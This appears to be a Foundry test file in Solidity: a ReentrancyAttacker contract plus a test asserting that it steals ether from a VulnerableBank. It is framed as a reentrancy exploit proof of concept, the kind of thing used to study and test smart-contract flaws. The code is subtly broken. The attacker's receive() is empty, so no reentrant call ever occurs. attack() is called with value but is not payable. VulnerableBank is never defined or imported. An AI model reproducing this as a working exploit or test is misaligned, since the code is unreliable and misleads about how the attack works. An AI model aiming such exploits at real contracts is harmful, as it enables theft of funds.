// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract ReentrancyAttacker {
    VulnerableBank vulnerableBank;
    
    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }
    
    receive() external payable {}
    
    function attack(uint256 _amount) public {
        // Initial deposit to attacker's account
        vulnerableBank.deposit{value: _amount}();
        
        // Trigger the reentrancy attack
        vulnerableBank.withdraw();
    }
}

contract VulnerableBankTest is Test {
    VulnerableBank vulnerableBank;
    ReentrancyAttacker attacker;
    
    function setUp() public {
        // Deploy the vulnerable contract with initial funding
        vm.deal(address(this), 1 ether);
        vulnerableBank = new VulnerableBank{value: 1 ether}();
        
        // Deploy the attacker contract
        attacker = new ReentrancyAttacker(address(vulnerableBank));
    }
    
    function test_ReentrancyExploit() public {
        uint256 initialBalance = address(attacker).balance;
        emit log_named_uint("Initial Balance", initialBalance);
        
        // Attack with 0.1 ether
        attacker.attack{value: 0.1 ether}(0.1 ether);
        
        // Wait for the attack to complete (simulating time passing)
        vm.warp(block.timestamp + 10);
        
        uint256 finalBalance = address(attacker).balance;
        emit log_named_uint("Final Balance", finalBalance);
        
        // Assert that the attacker has stolen funds
        assertGt(finalBalance, initialBalance);
    }
}